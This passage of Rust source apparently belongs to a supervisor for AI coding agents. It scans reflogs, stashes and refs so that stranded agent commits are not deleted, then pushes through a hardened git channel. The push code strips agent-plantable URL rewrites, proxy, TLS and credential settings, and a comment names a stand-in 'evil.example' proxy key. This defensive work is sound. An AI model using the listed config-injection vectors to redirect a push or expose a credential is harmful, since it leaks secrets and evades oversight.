                    }
                }
            }
            Err(e) => {
                // A failed branch sweep is an incomplete scan: fail closed and
                // retain rather than risk missing a stranded side branch.
                log(&format!(
                    "finalize: enumerating side branches failed — {e}; treating the scan as \
                     incomplete and retaining the run dir"
                ));
                out.retain = true;
            }
        }
    }

    // Detached-HEAD safety net: the branch sweep above only scans `refs/heads/`,
    // so it misses a commit the agent made on a DETACHED HEAD and then abandoned
    // (by switching back or deleting the temporary branch). Such a commit stays
    // reachable only through the HEAD reflog, so walk the reflog and flag any
    // POST-provisioning commit reachable from no local branch — stranded work
    // whose only copy is this run dir — and retain it. Runs even on an
    // empty/unborn base (no `start_sha`): there every uncovered reflog position
    // is post-provisioning agent work.
    //
    // COMPLETENESS — fail closed unless the scan demonstrably reaches back to
    // provisioning. The previous version trusted only the newest 200 reflog
    // entries, so an agent could bury an abandoned commit under >200 later HEAD
    // transitions, OR expire the reflog entirely, and the truncated scan would
    // silently miss it while a clean work-branch push let the only copy be
    // reaped. Guard BOTH vectors:
    //   * Read the WHOLE reflog via `git_untruncated` (no `-n` cap). An output
    //     overflowing the capture cap bails -> fail closed; a reflog with more
    //     than `MAX_REFLOG_SCAN` distinct positions is treated as unbounded ->
    //     fail closed, rather than spawning a per-entry subprocess storm an
    //     agent-controlled reflog could weaponise.
    //   * Require the provision-time HEAD (`start_sha`) to still appear in the
    //     reflog: the provision checkout recorded it, so its absence means the
    //     reflog was expired/rewritten BELOW provisioning and the scan can no
    //     longer prove no earlier detached commit was abandoned -> fail closed.
    //     (An unborn/empty base has no anchor; an untruncated read is then
    //     accepted as complete.)
    //
    // CLASSIFICATION — a commit is agent work iff it is reachable from NONE of
    // the provision-time ref tips (`provision_shas`), NOT iff `merge-base(start,
    // h) == start`. The latter only tests descent from `start`, so a commit the
    // agent made atop a PRE-EXISTING divergent branch (which shares history with
    // `start` but is not its descendant) would be misclassified as pre-existing
    // and its only copy reaped. FAIL CLOSED (treat as agent work, retain) on a
    // missing provision snapshot or any classification error.
    {
        match git_untruncated(
            &[
                "reflog".into(),
                "show".into(),
                "--format=%H".into(),
                "HEAD".into(),
            ],
            Some(workspace),
            timeout,
            None,
        )
        .await
        {
            Ok(entries) => {
                let mut distinct: Vec<String> = Vec::new();
                for h in entries.lines().map(str::trim).filter(|l| !l.is_empty()) {
                    if !distinct.iter().any(|t| t == h) {
                        distinct.push(h.to_string());
                    }
                }
                if distinct.len() > MAX_REFLOG_SCAN {
                    log(&format!(
                        "finalize: HEAD reflog has {} distinct positions (> {MAX_REFLOG_SCAN}); \
                         treating the detached-commit scan as unbounded and retaining the run dir \
                         rather than sweeping an agent-controlled reflog",
                        distinct.len()
                    ));
                    out.retain = true;
                } else if let Some(start) = &prep.start_sha {
                    if !distinct.iter().any(|h| h == start) {
                        log(&format!(
                            "finalize: HEAD reflog no longer contains the provision-time HEAD \
                             {start} (expired/rewritten); treating the detached-commit scan as \
                             incomplete and retaining the run dir"
                        ));
                        out.retain = true;
                    }
                }
                if !out.retain {
                    for h in &distinct {
                        // Skip positions already reachable from some branch tip.
                        let covered = git(
                            &[
                                "for-each-ref".into(),
                                "--contains".into(),
                                h.clone(),
                                "--format=%(refname)".into(),
                                "refs/heads/".into(),
                            ],
                            Some(workspace),
                            timeout,
                            None,
                        )
                        .await
                        .map(|s| !s.trim().is_empty())
                        .unwrap_or(false);
                        if covered {
                            continue;
                        }
                        // Reachable from no branch: agent work iff reachable from
                        // no provision-time ref tip. `rev-list h --not <tips>`
                        // prints `h` exactly when it is NOT in the provision
                        // closure (new agent commit); empty output means it
                        // pre-existed. FAIL CLOSED (agent work) on a missing
                        // snapshot or any error, so an inner-step failure never
                        // reaps a genuinely stranded commit.
                        let agent_made = match &prep.provision_shas {
                            None => true,
                            Some(shas) => {
                                let mut args: Vec<String> =
                                    vec!["rev-list".into(), h.clone(), "--not".into()];
                                args.extend(shas.iter().cloned());
                                match git(&args, Some(workspace), timeout, None).await {
                                    Ok(listed) => !listed.trim().is_empty(),
                                    Err(_) => true,
                                }
                            }
                        };
                        if agent_made {
                            log(&format!(
                                "finalize: commit {h} is reachable from no local branch and from no \
                                 provision-time ref tip (detached/abandoned agent work); retaining \
                                 the run dir so its only copy is not reaped"
                            ));
                            out.retain = true;
                            // Real work exists even though it is on no branch and
                            // `commits` stays empty — keep the empty-job detector
                            // from failing this quiet committing run as "empty".
                            out.work_found = true;
                            break;
                        }
                    }
                }
            }
            Err(e) => {
                log(&format!(
                    "finalize: reflog scan failed or overflowed the capture cap — {e}; treating \
                     the scan as incomplete and retaining the run dir"
                ));
                out.retain = true;
            }
        }
    }

    // Non-HEAD local-ref safety net: agent work can be parked under a local ref
    // that never moves HEAD and is not a branch, so neither the `refs/heads`
    // side-branch sweep nor the HEAD-reflog net above discovers it:
    //   * `git stash` stores WIP commits under `refs/stash` (a stack in that
    //     ref's own reflog) while HEAD stays put, and
    //   * a tag (or any other `refs/*` ref) can pin a commit the agent made and
    //     then abandoned without ever checking it out.
    // Left unseen, the run completes "clean" and is reaped with the only copy.
    // A provision clone fetches `--no-tags` and carries no stash, so these refs
    // are agent-created — but still classify each tip by REACHABILITY (a tag
    // merely pinning a commit already on a branch, or already at a provision
    // tip, strands nothing) so the net does not over-retain the common case.
    // Retain any POST-provisioning commit reachable from no local branch and no
    // provision-time ref tip. `refs/remotes/*` is agent-writable (a plain
    // `git fetch`/`update-ref` advances it, without the commit necessarily
    // reaching the real remote) yet is not covered by the local-head sweep
    // above, so a commit parked ONLY under an advanced remote-tracking ref would
    // otherwise have its sole copy reaped. Classification is by the provision
    // snapshot, NOT by mere presence on a remote-tracking ref (see the covered
    // check below).
    //
    // FAIL CLOSED: a truncated/failed enumeration must not read as "no parked
    // work" — retain. Bound the candidate set like the reflog net so an
    // agent-manufactured ref pile cannot stall finalize past its run timeout.
    {
        // Every ref OUTSIDE `refs/heads` (remote-tracking refs, tags, the
        // `refs/stash` tip, any other namespace). Capture the peeled commit too
        // so an ANNOTATED tag classifies by the commit it points at, not its tag
        // object. Filter the covered local-head namespace in Rust rather than
        // with `for-each-ref --exclude` (added only in git 2.39) so the sweep
        // works on older git too. `git_untruncated` fails closed if the listing
        // overflows the capture cap.
        let mut candidates: Vec<String> = Vec::new();
        match git_untruncated(
            &[
                "for-each-ref".into(),
                "--format=%(refname) %(objectname) %(*objectname)".into(),
                "refs/".into(),
            ],
            Some(workspace),
            timeout,
            None,
        )
        .await
        {
            Ok(list) => {
                for line in list.lines().map(str::trim).filter(|l| !l.is_empty()) {
                    let mut parts = line.split_whitespace();
                    let refname = parts.next().unwrap_or("");
                    if refname.starts_with("refs/heads/") {
                        continue;
                    }
                    // `%(*objectname)` is the peeled commit for an annotated tag
                    // and empty otherwise; prefer it, else the direct object.
                    let direct = parts.next().unwrap_or("");
                    let peeled = parts.next().unwrap_or("");
                    let sha = if !peeled.is_empty() { peeled } else { direct };
                    if !sha.is_empty() && !candidates.iter().any(|c| c == sha) {
                        candidates.push(sha.to_string());
                    }
                }
            }
            Err(e) => {
                log(&format!(
                    "finalize: enumerating non-head local refs failed or overflowed the capture \
                     cap — {e}; treating the scan as incomplete and retaining the run dir"
                ));
                out.retain = true;
            }
        }
        // A stash stacks MULTIPLE entries in `refs/stash`'s reflog; the
        // `for-each-ref` above yields only the top, so walk the full stash
        // reflog when `refs/stash` exists to catch buried stashes too.
        if !out.retain {
            let has_stash = git(
                &[
                    "rev-parse".into(),
                    "--verify".into(),
                    "--quiet".into(),
                    "refs/stash".into(),
                ],
                Some(workspace),
                timeout,
                None,
            )
            .await
            .map(|s| !s.trim().is_empty())
            .unwrap_or(false);
            if has_stash {
                match git_untruncated(
                    &[
                        "reflog".into(),
                        "show".into(),
                        "--format=%H".into(),
                        "refs/stash".into(),
                    ],
                    Some(workspace),
                    timeout,
                    None,
                )
                .await
                {
                    Ok(list) => {
                        for h in list.lines().map(str::trim).filter(|l| !l.is_empty()) {
                            if !candidates.iter().any(|c| c == h) {
                                candidates.push(h.to_string());
                            }
                        }
                    }
                    Err(e) => {
                        log(&format!(
                            "finalize: reading the stash reflog failed or overflowed the capture \
                             cap — {e}; treating the scan as incomplete and retaining the run dir"
                        ));
                        out.retain = true;
                    }
                }
            }
        }
        if !out.retain && candidates.len() > MAX_REFLOG_SCAN {
            log(&format!(
                "finalize: {} non-head-ref commits exceed the scan cap of {MAX_REFLOG_SCAN}; \
                 treating the scan as unbounded and retaining the run dir rather than sweeping an \
                 agent-controlled ref set",
                candidates.len()
            ));
            out.retain = true;
        }
        if !out.retain {
            for h in &candidates {
                // Skip commits already reachable from some LOCAL branch tip
                // (e.g. a tag on a commit the push will publish) — the push
                // makes those durable, so reaping the run dir loses nothing.
                //
                // Deliberately do NOT treat reachability from a `refs/remotes/*`
                // ref as "covered": the candidate itself sits on such a ref, so
                // a `--contains … refs/remotes/` probe would ALWAYS self-cover
                // and defeat this very net (the gap it exists to close). A
                // remote-tracking ref is agent-writable (`git update-ref
                // refs/remotes/origin/x <local-only-commit>` advances it without
                // the commit ever reaching the real remote), so "it's on a
                // remote-tracking ref" does NOT prove durability. Durability of a
                // genuinely-fetched origin commit is instead established below by
                // the provision-time snapshot (`provision_shas` spans
                // heads+remotes+tags at provision time), which classifies an
                // UNCHANGED remote ref as pre-existing (not retained) while
                // retaining only commits the agent ADVANCED a remote ref onto
                // post-provision.
                let covered = git(
                    &[
                        "for-each-ref".into(),
                        "--contains".into(),
                        h.clone(),
                        "--format=%(refname)".into(),
                        "refs/heads/".into(),
                    ],
                    Some(workspace),
                    timeout,
                    None,
                )
                .await
                .map(|s| !s.trim().is_empty())
                .unwrap_or(false);
                if covered {
                    continue;
                }
                // Reachable from no local branch: agent work iff reachable from
                // no provision-time ref tip. FAIL CLOSED (agent work) on a
                // missing snapshot or any error, mirroring the reflog net.
                let agent_made = match &prep.provision_shas {
                    None => true,
                    Some(shas) => {
                        let mut args: Vec<String> =
                            vec!["rev-list".into(), h.clone(), "--not".into()];
                        args.extend(shas.iter().cloned());
                        match git(&args, Some(workspace), timeout, None).await {
                            Ok(listed) => !listed.trim().is_empty(),
                            Err(_) => true,
                        }
                    }
                };
                if agent_made {
                    log(&format!(
                        "finalize: commit {h} is parked under a non-head ref (stash/tag/\
                         remote-tracking) and is reachable from no local branch and no \
                         provision-time ref tip (stranded agent work); retaining the run dir so \
                         its only copy is not reaped"
                    ));
                    out.retain = true;
                    // Real work exists even though it is on no branch and
                    // `commits` stays empty — keep the empty-job detector from
                    // failing this quiet committing run as "empty".
                    out.work_found = true;
                    break;
                }
            }
        }
    }

    if prep.want_push {
        if let Some(branch) = &prep.working_branch {
            // FAIL CLOSED: `retain` means a scan above was incomplete or found
            // stranded work, so finalize could not prove it accounted for every
            // agent commit. Pushing the prepared branch anyway would publish a
            // KNOWN-incomplete set and report `pushed = true`, letting the run
            // dir (and the only copy of the unaccounted work) be reaped. Refuse
            // the push whenever `retain` is set; leave the work unpublished and
            // retained for recovery.
            if out.retain {
                log(&format!(
                    "finalize: refusing to push {branch:?} — a scan was incomplete or found \
                     stranded work (retain set), so the push would publish only a partial account \
                     of the agent's commits; leaving the run dir retained"
                ));
            } else if !out.commits.is_empty() {
                // This push runs AFTER arbitrary agent code controlled the
                // checkout, so it must not trust agent-mutable state:
                //  - `core.hooksPath=/dev/null` disables any `.git/hooks/pre-push`
                //    (or a redirected hooksPath) the agent planted — a hook would
                //    otherwise run with `git()`'s env, which carries
                //    `NANO_GIT_CRED_PASS` for the credential helper.
                //  - push to the TRUSTED `fetch_url` (the credential-free form of
                //    the configured `repo.url`), never the agent-rewritable
                //    `origin` remote in `.git/config` — so the push goes to the
                //    configured destination, not an attacker-selected one.
                //  - but git still applies `url.<base>.insteadOf`/`pushInsteadOf`
                //    rewrites from the (agent-writable) local config to that very
                //    `fetch_url`, so a planted rewrite could silently redirect the
                //    push off-box. Strip those local-sourced rewrites first; fail
                //    CLOSED (skip the push, retain) if they cannot be neutralized.
                //  - the GLOBAL config is NOT trusted host state either: agents
                //    inherit the daemon's `HOME` and run as the same account, so
                //    they can plant a `url.*.insteadOf`, an `http.proxy`, or a TLS
                //    loosening in `~/.gitconfig` that this local-only scrub never
                //    sees — and for an HTTP credential URL a proxy would receive
                //    the helper-supplied Basic credential. So the push runs with
                //    the GLOBAL config isolated to `/dev/null` (no host
                //    insteadOf/proxy/TLS applies), and every rewrite stripped from
                //    the local config is re-asserted via `-c` (a command-line
                //    entry outranks any included file the local scrub could not
                //    reach). The credential is still delivered out of band by
                //    `git()`'s host-matched helper, so the token never reaches argv.
                match neutralize_untrusted_local_config(workspace, timeout).await {
                    Err(e) => {
                        log(&format!(
                            "finalize: could not neutralize untrusted local git config before \
                             push — {e}; skipping the push and retaining the run dir so work is \
                             not pushed to a possibly rewritten/MITM'd destination"
                        ));
                        out.retain = true;
                    }
                    Ok(rewrites) => {
                        // Push to the SAME trusted source the clone used: a
                        // relative local `repo.url` (e.g. `./origin.git`) must be
                        // re-anchored to the supervisor cwd, not re-resolved
                        // against the checkout (which would target the wrong — or
                        // no — destination and report `pushed: false`).
                        let (fetch_url, cred) = trusted_fetch_source(&repo.url);
                        // Re-assert each scrubbed rewrite's inverse so the push
                        // resolves the TRUSTED `fetch_url` even if an included
                        // file re-adds the rewrite: `url.<fetch_url>.insteadOf =
                        // <attacker-base>` turns the redirect back onto the
                        // trusted destination. This `-c` prefix (`cfg`) is reused
                        // for the post-error remote verification below, so that
                        // check runs over the SAME isolated/trusted channel.
                        let mut cfg: Vec<String> =
                            vec!["-c".into(), "core.hooksPath=/dev/null".into()];
                        for (key, value) in &rewrites {
                            if let Some(base) = key
                                .strip_prefix("url.")
                                .or_else(|| key.strip_prefix("URL."))
                                .and_then(|rest| {
                                    rest.strip_suffix(".insteadOf")
                                        .or_else(|| rest.strip_suffix(".insteadof"))
                                        .or_else(|| rest.strip_suffix(".pushInsteadOf"))
                                        .or_else(|| rest.strip_suffix(".pushinsteadof"))
                                })
                            {
                                cfg.push("-c".into());
                                cfg.push(format!("url.{fetch_url}.insteadOf={base}"));
                                let _ = value; // the rewrite target; the inverse needs only the base.
                            }
                        }
                        let mut args = cfg.clone();
                        args.push("push".into());
                        args.push("--".into());
                        args.push(fetch_url.clone());
                        args.push(format!("refs/heads/{branch}:refs/heads/{branch}"));
                        match git_isolated(&args, Some(workspace), timeout, cred.as_ref()).await {
                            Ok(_) => out.pushed = true,
                            Err(e) => {
                                // A nonzero/timed-out push does NOT prove the ref
                                // was not updated: the server can apply the
                                // fast-forward and only then the client loses the
                                // response (dropped connection, timeout). Reporting
                                // `pushed = false` here would tell the process model
                                // the branch is unpublished, and the redelivery
                                // would cut a DUPLICATE fallback branch for work that
                                // is already durable. Verify the real remote tip over
                                // the same trusted/isolated channel; only fail closed
                                // (retain) when publication cannot be CONFIRMED.
                                match remote_contains_branch_tip(
                                    workspace,
                                    &cfg,
                                    &fetch_url,
                                    branch,
                                    cred.as_ref(),
                                    timeout,
                                )
                                .await
                                {
                                    Some(true) => {
                                        log(&format!(
                                            "finalize: push of {branch} reported an error ({e}), \
                                             but the trusted remote already contains its commits — \
                                             treating the push as landed"
                                        ));
                                        out.pushed = true;
                                    }
                                    confirmed => {
                                        let why = if confirmed == Some(false) {
                                            "the trusted remote does not contain its commits"
                                        } else {
                                            "the remote ref could not be verified"
                                        };
                                        log(&format!(
                                            "finalize: push of {branch} failed — {e}; {why}, \
                                             retaining the run dir so the work is not lost"
                                        ));
                                        out.retain = true;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    out
}

/// After a finalize push returns an error, decide whether the branch's commits
/// are nevertheless durable on the trusted remote. A nonzero/timed-out
/// `git push` is NOT proof the ref was not updated: the server can accept the
/// fast-forward and apply it before the client sees the response. Fetch the
/// branch from the SAME trusted `fetch_url`, under the SAME config isolation and
/// rewrite re-assertion the push used (`cfg` carries the `-c` prefix), then:
///
/// * `Some(true)` — the remote tip EQUALS or is a DESCENDANT of the local
///   branch tip, so every commit we meant to publish is on the remote.
/// * `Some(false)` — the remote branch exists but does not contain the local
///   tip (a genuine non-fast-forward / rejected push).
/// * `None` — the remote state could not be read (treat as unconfirmed).
///
/// Callers fail CLOSED on `Some(false)`/`None` (retain), reporting
/// `pushed = true` only on `Some(true)`.
async fn remote_contains_branch_tip(
    workspace: &CwdHandle,
    cfg: &[String],
    fetch_url: &str,
    branch: &str,
    cred: Option<&GitCredential>,
    timeout: Duration,
) -> Option<bool> {
    // The local branch tip is trusted repo state (just prepared/committed).
    let local_tip = git(
        &[
            "rev-parse".into(),
            "--verify".into(),
            "-q".into(),
            format!("refs/heads/{branch}^{{commit}}"),
        ],
        Some(workspace),
        timeout,
        None,
    )
    .await
    .ok()?;
    let local_tip = local_tip.trim().to_string();
    if local_tip.is_empty() {
        return None;
    }
    // Ask the trusted remote for the branch's current tip (no local fetch/merge
    // side effects): `ls-remote <url> refs/heads/<branch>` → `<sha>\t<ref>`.
    let mut ls = cfg.to_vec();
    ls.push("ls-remote".into());
    ls.push("--".into());
    ls.push(fetch_url.to_string());
    ls.push(format!("refs/heads/{branch}"));
    let listing = git_isolated(&ls, Some(workspace), timeout, cred).await.ok()?;
    let remote_tip = listing
        .lines()
        .find_map(|l| l.split_whitespace().next())
        .map(str::to_string);
    let Some(remote_tip) = remote_tip.filter(|s| !s.is_empty()) else {
        // The remote has no such branch — the push did not land.
        return Some(false);
    };
    if remote_tip == local_tip {
        return Some(true);
    }
    // Different tip: landed iff the remote is a DESCENDANT of our local tip
    // (someone fast-forwarded on top). That requires the remote object locally,
    // so fetch it into FETCH_HEAD over the same trusted channel; if we cannot
    // obtain it, fail closed (unconfirmed).
    let mut fetch = cfg.to_vec();
    fetch.push("fetch".into());
    fetch.push("--no-tags".into());
    fetch.push("--".into());
    fetch.push(fetch_url.to_string());
    fetch.push(format!("refs/heads/{branch}"));
    git_isolated(&fetch, Some(workspace), timeout, cred).await.ok()?;
    let landed = git(
        &[
            "merge-base".into(),
            "--is-ancestor".into(),
            local_tip,
            remote_tip,
        ],
        Some(workspace),
        timeout,
        None,
    )
    .await
    .is_ok();
    Some(landed)
}

/// Neutralize agent-mutable URL rewrites AND untrusted transport settings in the
/// workspace's LOCAL git config before the finalize push. That push hands git
/// the trusted `fetch_url` positionally, but git still applies agent-writable
/// `.git/config` state to it:
///   * `url.<base>.insteadOf`/`pushInsteadOf` rewrites (read from `.git/config`
///     and any file it `include`s) can silently redirect the push off-box even
///     though `origin` is never consulted; and
///   * transport settings — `http.proxy` (incl. URL-scoped `http.<url>.proxy`),
///     `http.sslVerify=false`, custom `http.sslCAInfo`/`sslCAPath`,
///     `core.sshCommand`, `core.gitProxy`, `protocol.*` or local `credential.*`
///     — can route the authenticated push through an attacker-controlled MITM
///     and expose the helper-supplied credential, WITHOUT any URL rewrite.
///
/// Agent code controlled the checkout, so the repository-local config is
/// untrusted: strip every local-sourced rewrite, every local transport knob,
/// AND the local `include`/`includeIf` directives (an included file is another
/// place any of these can hide; git does not surface included values under
/// `--local`, but removing the directive that pulls them in disables them).
/// Global config is handled separately: the push isolates it
/// (`GIT_CONFIG_GLOBAL=/dev/null`) because the agent shares the daemon's `HOME`.
///
/// Both the repository-local scope (`.git/config`) AND the per-worktree scope
/// (`.git/config.worktree`) are scrubbed. The worktree scope is NOT a subset of
/// `--local`: when the agent enables `extensions.worktreeConfig`, git loads
/// `config.worktree` on top of `.git/config` for the push, yet `git config
/// --local --list` omits it entirely — so a `url.*.insteadOf`, `http.proxy`, or
/// TLS setting planted there would survive a local-only scrub and restore the
/// redirect/MITM path. `--worktree` writes/reads `config.worktree` when the
/// extension is on and simply aliases `--local` when it is off (a harmless
/// re-scan of the already-clean local file), so scrubbing both scopes closes
/// the class with the same fail-closed behavior.
///
/// `--list` enumerates every direct key=value in the scope and always exits 0
/// (even for an empty config), so — unlike `--get-regexp`, whose exit 1 for "no
/// match" `git()` cannot distinguish from a real error — any `Err` here is a
/// genuine failure and is propagated. It is read via [`git_untruncated`] so a
/// config larger than the captured stdout tail (an agent could bury a rewrite
/// near the start and pad the file past the cap) fails CLOSED instead of being
/// scrubbed on a partial listing. The caller treats any `Err` as fail-closed:
/// the push is skipped and the run dir retained rather than risk a redirect.
///
/// Returns the `(url.<base>.insteadOf|pushInsteadOf, value)` pairs it removed,
/// so the caller can re-assert each rewrite's inverse via `-c` on the push
/// itself (a legitimate host-level rewrite isolated away by `/dev/null` must be
/// re-applied). Transport knobs are NOT re-asserted — they are purely untrusted
/// local state and the push is safer without them.
async fn neutralize_untrusted_local_config(
    workspace: &CwdHandle,
    timeout: Duration,
) -> Result<Vec<(String, String)>> {
    // Scrub `.git/config` first, then the per-worktree `config.worktree`. Order
    // matters only when the extension is DISABLED (then `--worktree` aliases
    // `--local`): the second pass re-scans the now-clean local file and finds
    // nothing to unset, which is a safe no-op.
    let mut rewrites = scrub_git_config_scope(workspace, timeout, "--local").await?;
    rewrites.extend(scrub_git_config_scope(workspace, timeout, "--worktree").await?);
    Ok(rewrites)
}

/// Scrub agent-mutable URL rewrites, transport/credential knobs, and
/// `include`/`includeIf` directives from ONE git-config `scope` (`--local` or
/// `--worktree`), returning the `(url.*.insteadOf|pushInsteadOf, value)` pairs
/// it removed. Read via [`git_untruncated`] so an oversized listing fails CLOSED
/// (propagated `Err`) rather than being scrubbed on a truncated tail. See
/// [`neutralize_untrusted_local_config`] for the full rationale.
async fn scrub_git_config_scope(
    workspace: &CwdHandle,
    timeout: Duration,
    scope: &str,
) -> Result<Vec<(String, String)>> {
    let listed = git_untruncated(
        &["config".into(), scope.into(), "--list".into()],
        Some(workspace),
        timeout,
        None,
    )
    .await?;
    // A multi-valued key (e.g. repeated `include.path`) appears once per value;
    // `--unset-all` removes them all in one call, and a second `--unset-all` on
    // the now-absent key would error (exit 5) and spuriously fail closed — so
    // dedupe before unsetting.
    let mut seen: std::collections::BTreeSet<String> = std::collections::BTreeSet::new();
    let mut rewrites: Vec<(String, String)> = Vec::new();
    for line in listed.lines().map(str::trim).filter(|l| !l.is_empty()) {
        let (key, value) = line.split_once('=').unwrap_or((line, ""));
        let lower = key.to_ascii_lowercase();
        let is_rewrite = lower.ends_with(".insteadof") || lower.ends_with(".pushinsteadof");
        let is_include = lower.starts_with("include.") || lower.starts_with("includeif.");
        if is_rewrite {
            rewrites.push((key.to_string(), value.to_string()));
        }
        if (is_rewrite || is_include || is_untrusted_transport_key(&lower))
            && seen.insert(key.to_string())
        {
            git(
                &[
                    "config".into(),
                    scope.into(),
                    "--unset-all".into(),
                    key.to_string(),
                ],
                Some(workspace),
                timeout,
                None,
            )
            .await?;
        }
    }
    Ok(rewrites)
}

/// True for a local git-config key that controls transport/credential routing
/// and so could redirect or MITM the authenticated finalize push if an agent
/// planted it. Keyed on the lowercased key name so URL-scoped variants
/// (`http.https://evil.example.proxy`) and case tricks are caught. Deliberately
/// targets the transport surface only — core identity keys (`core.bare`,
/// `core.repositoryformatversion`, `extensions.*`) that the repo needs to
/// function are left intact.
fn is_untrusted_transport_key(lower: &str) -> bool {
    lower.starts_with("http.")
        || lower.starts_with("https.")
        || lower.starts_with("protocol.")
        || lower.starts_with("credential.")
        || matches!(
            lower,
            "core.sshcommand" | "core.askpass" | "core.gitproxy" | "core.fsmonitor"
        )
}

/// Run git, returning its captured stdout (bounded to a `GIT_STDOUT_TAIL` tail).
async fn git(
    args: &[String],
    cwd: Option<&CwdHandle>,
    timeout: Duration,
    cred: Option<&GitCredential>,
) -> Result<String> {
    git_with_env(args, cwd, timeout, cred, &[]).await
}

/// Like [`git`], but fails CLOSED when git's stdout exceeded the retained
/// `GIT_STDOUT_TAIL` and leading bytes were dropped. Security scrubs that must
/// act on the COMPLETE output (e.g. `config --list`, `for-each-ref`) use this so
/// an agent cannot push a rewrite/include/ref out of the captured tail and have
/// a truncated listing silently reported as clean.
/// Environment-based git **config-injection** channels, scrubbed from every git
/// child by [`git_with_env_capture`]. git applies
/// `GIT_CONFIG_COUNT`/`GIT_CONFIG_KEY_<n>`/`GIT_CONFIG_VALUE_<n>` as the
/// highest-priority config (above every on-disk file), so each bypasses the
/// `GIT_CONFIG_GLOBAL`/`GIT_CONFIG_SYSTEM=/dev/null` file isolation. `GIT_CONFIG`
/// (legacy single-file) and `GIT_CONFIG_PARAMETERS` round out the config tier.
///
/// TRANSPORT channels (`GIT_SSH`, `GIT_SSH_COMMAND`, `GIT_ASKPASS`,
/// `GIT_PROXY_COMMAND`) are deliberately NOT scrubbed: they are the operator's
/// legitimate provisioning authentication (an SSH clone/fetch/push relies on
/// `GIT_SSH_COMMAND`; the credential-helper path is HTTPS-only), and scrubbing
/// them would break supported SSH/HTTPS remotes starting with the very first
/// clone. The agent runs as a child process and cannot mutate the daemon's own
/// environment, so these inherited vars are as trusted as the daemon itself —
/// the agent's injection surface is on-disk config (handled by the global/system
/// isolation and `insteadOf` stripping on the finalize push) and `.git/hooks`
/// (handled by `core.hooksPath=/dev/null`), not the environment.
const GIT_CONFIG_INJECTION_ENV: &[&str] = &[
    "GIT_CONFIG",
    "GIT_CONFIG_COUNT",
    "GIT_CONFIG_PARAMETERS",
];

async fn git_untruncated(
    args: &[String],
    cwd: Option<&CwdHandle>,
    timeout: Duration,
    cred: Option<&GitCredential>,
) -> Result<String> {
    let (out, truncated) = git_with_env_capture(args, cwd, timeout, cred, &[]).await?;
    if truncated {
        bail!(
            "git {} stdout exceeded the {GIT_STDOUT_TAIL}-byte capture cap; refusing to act on a \
             truncated listing",
            args.first().map(String::as_str).unwrap_or("")
        );
    }
    Ok(out)
}

/// Run git with the GLOBAL (and XDG) **and** SYSTEM config isolated to
/// `/dev/null`, so no config the supervisor did not itself write
/// (`url.*.insteadOf`, `http.proxy`, TLS settings, …) applies. Used for the
/// authenticated finalize push: the agent shares the daemon's `HOME`, so global
/// config is untrusted — and the system config (`/etc/gitconfig`) is likewise
/// not something finalize controls, so a system-level `insteadOf`/`http.proxy`
/// could silently rewrite or MITM the push. Both tiers therefore fail closed to
/// `/dev/null` (plus `GIT_CONFIG_NOSYSTEM=1` so system config is not consulted
/// at all). Environment-based config-injection channels (`GIT_CONFIG_COUNT`, …)
/// — which apply above every config file — are scrubbed for every git child by
/// [`git_with_env_capture`]; transport channels (`GIT_SSH_COMMAND`, …) are left
/// intact as operator-supplied authentication (see `GIT_CONFIG_INJECTION_ENV`).
/// The credential helper is still injected via `-c` (see below), which these
/// overrides do not touch.
async fn git_isolated(
    args: &[String],
    cwd: Option<&CwdHandle>,
    timeout: Duration,
    cred: Option<&GitCredential>,
) -> Result<String> {
    git_with_env(
        args,
        cwd,
        timeout,
        cred,
        &[
            ("GIT_CONFIG_GLOBAL", "/dev/null"),
            ("GIT_CONFIG_SYSTEM", "/dev/null"),
            ("GIT_CONFIG_NOSYSTEM", "1"),
        ],
    )
    .await
}

async fn git_with_env(
    args: &[String],
    cwd: Option<&CwdHandle>,
    timeout: Duration,
    cred: Option<&GitCredential>,
    extra_env: &[(&str, &str)],
) -> Result<String> {
    git_with_env_capture(args, cwd, timeout, cred, extra_env)
        .await
        .map(|(out, _truncated)| out)
}

/// Core git runner. Returns `(stdout_tail, stdout_truncated)`; `stdout_truncated`
/// is `true` when git emitted more than `GIT_STDOUT_TAIL` and leading bytes were
/// dropped. Most callers go through [`git`]/[`git_with_env`] and ignore the
/// flag (commit enumerations are a handful of SHAs and already treat a tail as
/// possibly-partial); [`git_untruncated`] threads it through to fail closed.
async fn git_with_env_capture(
    args: &[String],
    cwd: Option<&CwdHandle>,
    timeout: Duration,
    cred: Option<&GitCredential>,
    extra_env: &[(&str, &str)],
) -> Result<(String, bool)> {
    use std::process::Stdio;
    let mut cmd = Command::new("git");
    // A credential is delivered out of band via git's credential-helper
    // protocol so the secret never reaches argv (world-readable
    // `/proc/<pid>/cmdline`). The helper snippet itself is not secret — it only
    // names env vars — and is host-scoped so a `--recurse-submodules` fetch to a
    // different host is never handed this repo's token. The empty
    // `credential.helper=` first resets any host/global helper so ours is the
    // only one consulted. These `-c` flags must precede the git subcommand.
    if let Some(c) = cred {
        // Read the request on stdin (draining it), emit the credential only for
        // a `get` on the matching host, and ignore `store`/`erase`.
        let helper = "!f() { \
            test \"$1\" = get || exit 0; \
            h=; \
            while IFS='=' read -r k v; do test x\"$k\" = xhost && h=${v%%:*}; done; \
            test x\"$h\" = x\"$NANO_GIT_CRED_HOST\" || exit 0; \
            printf 'username=%s\\npassword=%s\\n' \"$NANO_GIT_CRED_USER\" \"$NANO_GIT_CRED_PASS\"; \
        }; f";
        cmd.arg("-c").arg("credential.helper=");
        cmd.arg("-c").arg(format!("credential.helper={helper}"));
        cmd.env("NANO_GIT_CRED_HOST", &c.host);
        cmd.env("NANO_GIT_CRED_USER", &c.username);
        cmd.env("NANO_GIT_CRED_PASS", &c.password);
    }
    cmd.args(args);
    // Kill (and reap) the git child if this future is dropped — e.g. when the
    // timeout below fires — so a timed-out clone/fetch can't keep running and
    // mutate the workspace while a retry starts.
    cmd.kill_on_drop(true);
    if let Some(dir) = cwd {
        // Enter the working directory through the pinned, no-follow capability
        // (`fchdir` in the child's `pre_exec`) rather than re-resolving a path
        // at spawn time: the run dir can sit under a world-writable ancestor,
        // so a same-UID actor could otherwise swap a component for a symlink
        // between provisioning and this git step and redirect it outside the
        // validated tree (#35). The caller holds the handle open, so the bind
        // targets the prepared inode even across a post-prepare path swap.
        dir.apply(&mut cmd)
            .context("binding git working directory")?;
    }
    // Never prompt for credentials interactively (would hang the slot).
    cmd.env("GIT_TERMINAL_PROMPT", "0");
    // Caller-supplied environment (e.g. `git_isolated`'s global-config
    // isolation) is applied before the spawn.
    for (k, v) in extra_env {
        cmd.env(k, v);
    }
